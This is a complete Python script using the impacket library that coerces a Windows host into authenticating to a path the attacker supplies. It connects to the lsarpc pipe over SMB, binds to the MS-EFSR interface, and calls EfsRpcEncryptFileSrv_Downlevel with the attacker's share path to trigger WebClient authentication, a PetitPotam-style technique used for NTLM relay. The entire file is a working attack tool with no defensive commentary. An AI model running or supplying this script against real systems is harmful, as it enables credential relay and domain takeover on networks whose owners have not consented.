#!/usr/bin/env python3



import sys
import argparse
from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_GSS_KERBEROS, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.uuid import uuidtup_to_bin


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'SessionError: unknown error code: 0x%x' % self.error_code


class EfsRpcEncryptFileSrv_Downlevel(NDRCALL):
    opnum = 4
    structure = (
        ('FileName', WSTR),
    ) 
    
class EfsRpcEncryptFileSrv_DownlevelResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )

class RPCProtocol(object):
    uuid = None
    version = None
    pipe = None

    ncan_target = None
    __rpctransport = None
    dce = None

    def __init__(self):
        super(RPCProtocol, self).__init__()

    def connect(self, username, password, domain, lmhash, nthash, target, dcHost, doKerberos=False, targetIp=None):
        self.ncan_target = r'ncacn_np:%s[%s]' % (target, self.pipe)
        self.__rpctransport = transport.DCERPCTransportFactory(self.ncan_target)
        self.__rpctransport.set_dport(445)
        if hasattr(self.__rpctransport, 'set_credentials'):
            self.__rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash
            )

        if doKerberos == True:
            self.__rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if targetIp is not None:
            self.__rpctransport.setRemoteHost(targetIp)

        self.dce = self.__rpctransport.get_dce_rpc()
        self.dce.set_auth_type(RPC_C_AUTHN_WINNT)
        self.dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        print(f"[>] Connecting to {self.ncan_target}")
        try:
            self.dce.connect()
        except Exception as e:
            print(f"[-] error {str(e)}")
            return False

        print(f"Binding to <uuid='{self.uuid}', version='{self.version}'>")
        try:
            self.dce.bind(uuidtup_to_bin((self.uuid, self.version)))
        except Exception as e:
            print(f"[-] ]error: {str(e)}")
            return False

        return True


class MS_EFSR(RPCProtocol):
    uuid = "c681d488-d850-11d0-8c52-00c04fd90f7e"
    version = "1.0"
    #pipe = r"\pipe\lsass"
    pipe = r"\pipe\lsarpc"

    def EfsRpcEncryptFileSrv_Downlevel(self, source):
        if self.dce is not None:
            print("Calling EfsRpcEncryptFileSrv_Downlevel")
            try:
                request = EfsRpcEncryptFileSrv_Downlevel()
                request['FileName'] = f'{source}\x00'                
                resp = self.dce.request(request)
                resp.dump()
            except Exception as e:
                print(e)
        else:
            print("[-] Error, call connect")

if __name__ == '__main__':

    parser = argparse.ArgumentParser(add_help=True, description="Trigger WebClient with EfsRpcEncryptFileSrv")

    parser.add_argument("-u", "--username", default="", help="auth username")
    parser.add_argument("-p", "--password", default="", help="auth password")
    parser.add_argument("-d", "--domain", default="", help="auth domain")
    parser.add_argument("--hashes", action="store", metavar="[LMHASH]:NTHASH", help="NTLM hash")
    parser.add_argument("--no-pass", action="store_true", help="no pass for kerberos")
    parser.add_argument("-k", "--kerberos", action="store_true", help="use tgt")
    parser.add_argument("--dc-ip", action="store", metavar="ip address", help="domain controll ip")
    parser.add_argument("--target-ip", action="store", metavar="ip address", help="target ip address")
    parser.add_argument("-s", "--share", action="store", help="share path")
    parser.add_argument("target", help="IP address or hostname of target")

    options = parser.parse_args()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash, nthash = '', ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass

        options.password = getpass("Password:")

    protocol = MS_EFSR()

    connected = protocol.connect(
        username=options.username,
        password=options.password,
        domain=options.domain,
        lmhash=lmhash,
        nthash=nthash,
        target=options.target,
        doKerberos=options.kerberos,
        dcHost=options.dc_ip,
        targetIp=options.target_ip
    )

    if connected:
        protocol.EfsRpcEncryptFileSrv_Downlevel(options.share)

    sys.exit()